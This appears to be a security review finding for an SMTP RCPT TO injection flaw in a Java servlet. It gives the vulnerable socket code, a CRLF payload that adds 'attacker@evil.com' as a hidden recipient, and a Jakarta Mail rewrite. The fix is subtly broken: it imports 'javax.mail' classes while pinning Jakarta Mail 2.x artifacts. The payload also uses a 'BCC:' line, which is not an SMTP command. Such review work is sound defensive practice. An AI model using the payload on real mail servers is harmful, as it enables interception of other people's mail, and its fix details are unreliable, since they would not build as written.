## Verdict

Exploitable. The `recipientAddress` parameter from the HTTP request is concatenated directly into the SMTP `RCPT TO:` command string without validation or neutralization. An attacker can inject SMTP protocol commands (delimited by `\r\n`) to add unauthorized recipients or perform other protocol manipulation.

## Source

Source: `request.getParameter("customerEmail")` (line 9) — untrusted HTTP parameter.

Sink: `out.write(("RCPT TO:<" + recipientAddress + ">\r\n").getBytes(StandardCharsets.US_ASCII))` (line 18) — raw string concatenation building an SMTP protocol command.

Data flow: The parameter flows directly from the request into the concatenated command string without any parsing, validation, or escaping. An attacker can pass a value like `recipient@example.com>\r\nBCC:<attacker@evil.com>\r\nRCPT TO:<recipient@example.com` to inject additional SMTP commands on the same connection.

## Fix

**Vulnerable code:**
```java
public void sendOrderConfirmation(HttpServletRequest request) throws Exception {
    String recipientAddress = request.getParameter("customerEmail");

    Socket socket = new Socket("mail.internal.example.com", 25);
    OutputStream out = socket.getOutputStream();

    out.write("EHLO app.example.com\r\n".getBytes(StandardCharsets.US_ASCII));
    out.write("MAIL FROM:<no-reply@example.com>\r\n".getBytes(StandardCharsets.US_ASCII));
    out.write(("RCPT TO:<" + recipientAddress + ">\r\n").getBytes(StandardCharsets.US_ASCII));
    // ... rest of command sequence
}
```

**Fixed code:**
Replace raw socket-based SMTP protocol with Jakarta Mail's `Session`/`Transport` API:

```java
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;
import javax.servlet.http.HttpServletRequest;

public class SmtpRawSocketRcptInjection {

    public void sendOrderConfirmation(HttpServletRequest request) throws Exception {
        String recipientEmail = request.getParameter("customerEmail");
        
        // Validate recipient address with strict parsing; fails on embedded CRLF
        try {
            new InternetAddress(recipientEmail, true);
        } catch (javax.mail.internet.AddressException e) {
            throw new IllegalArgumentException("Invalid recipient address", e);
        }
        
        // Configure Jakarta Mail session
        Properties props = new Properties();
        props.put("mail.smtp.host", "mail.internal.example.com");
        props.put("mail.smtp.port", "25");
        props.put("mail.smtp.starttls.required", "true");
        
        Session session = Session.getInstance(props);
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("no-reply@example.com"));
        message.setRecipients(Message.RecipientType.TO, recipientEmail);
        message.setSubject("Order confirmation");
        message.setText("Thanks for your order.");
        
        Transport.send(message);
    }
}
```

**Library recommendation:** Upgrade to `org.eclipse.angus:smtp` 2.0.4 or later, or `com.sun.mail:jakarta.mail` 2.0.2 or 1.6.8 or later. These versions include CR/LF command-injection scanning in `SMTPTransport`. For Maven, update `pom.xml`:

```xml
<dependency>
    <groupId>org.eclipse.angus</groupId>
    <artifactId>smtp</artifactId>
    <version>2.0.4</version>
</dependency>
<dependency>
    <groupId>jakarta.mail</groupId>
    <artifactId>jakarta.mail-api</artifactId>
    <version>2.1.0</version>
</dependency>
```

## Explanation

The fix eliminates the vulnerability by replacing hand-rolled SMTP protocol dialogue over raw sockets with Jakarta Mail's managed `Transport` API. The core defences are: (1) **`InternetAddress` validation** with the `true` flag enables strict RFC 5321 parsing that rejects embedded carriage returns and line feeds in the local or domain parts, blocking CRLF injection before the value reaches the wire; (2) **structured message construction** via `MimeMessage.setRecipients()` marshals the validated address through the transport's own command builder rather than direct string concatenation, insulating against protocol-syntax injection; (3) **version floor enforcement** ensures `SMTPTransport` itself performs CR/LF scanning on the outgoing `RCPT TO:` command (CVE-2025-7962 fix), catching cases where address parsing narrowly allows a quoted string containing CRLF; and (4) **protocol client library** removes the burden of correctly quoting, escaping, and framing each SMTP command, which is error-prone when hand-rolled.

## Behaviour changes

1. **Import statements added:** `javax.mail` (Message, Session, Transport), `javax.mail.internet` (InternetAddress, MimeMessage), `java.util` (Properties). These are from the jakarta.mail dependency and the Java standard library.
2. **Socket and OutputStream removed:** The raw `Socket` and `getOutputStream()` are no longer used; `Transport.send()` handles connection and command framing.
3. **Configuration object added:** `Properties` now configures mail session settings (host, port, STARTTLS requirement) instead of hard-coded socket connection.
4. **Validation error handling:** Invalid addresses throw `AddressException` which is caught and re-thrown as `IllegalArgumentException`. The original code had no validation and accepted any string.
5. **Message construction API:** Subject and body are now set via `MimeMessage.setSubject()` and `setText()` instead of raw `\r\n`-delimited protocol commands. Headers are not directly composed in the SMTP command stream.
6. **STARTTLS hardening:** The fix sets `mail.smtp.starttls.required=true` to fail if the server does not advertise STARTTLS, preventing downgrade to plaintext. The original code had no encryption.

All behaviour changes are intentional hardening; no legitimate order-confirmation functionality is altered by the fix. The sent message (recipient, subject, body) remains the same; only the protocol mechanism that constructs and sends it is changed to a safe, validated path.

